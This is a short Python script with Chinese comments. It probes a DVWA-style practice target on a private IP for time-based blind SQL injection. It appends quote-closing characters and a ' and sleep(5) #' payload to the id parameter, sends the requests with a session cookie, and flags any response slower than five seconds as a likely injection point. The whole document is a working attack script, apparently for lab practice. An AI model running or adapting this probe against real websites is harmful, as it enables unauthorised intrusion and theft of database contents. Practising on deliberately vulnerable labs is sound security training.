import sys
import requests
import time
from urllib.parse import quote

# 目标基础URL
base_url = "http://10.1.10.2/vulnerabilities/sqli/?id=1"
# 特殊字符列表
dict_strings = ["'", '"', "')", '")', "'))", '"))', "}"]
# 请求头部，模拟浏览器访问
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36',
    'Cookie': 'security=low; PHPSESSID=bud3mjq30q9nqrk90e73qb9gmc'
}
# SQL注入测试负载
payloads = " and sleep(5) #"
# 响应时间阈值（秒）
response_threshold = 5

# 创建一个会话以复用TCP连接
session = requests.Session()
session.headers.update(headers)

for i in dict_strings:
    try:
        # 对特殊字符和负载进行URL编码
        encoded_string = quote(i)
        full_url = f"{base_url}{encoded_string}{quote(payloads)}&Submit=Submit#"

        # 记录请求发送前的时间
        start_time = time.time()
        # 发送GET请求
        response = session.get(full_url)
        # 记录请求完成的时间
        end_time = time.time()

        # 计算响应时间
        response_time = end_time - start_time

        # 判断响应时间是否超过设定的阈值
        if response_time > response_threshold:
            print(f"{i} 可能存在SQL注入漏洞")
    except requests.RequestException as e:
        print(f"请求错误 {i}: {e}")

# 正常退出程序
sys.exit(0)
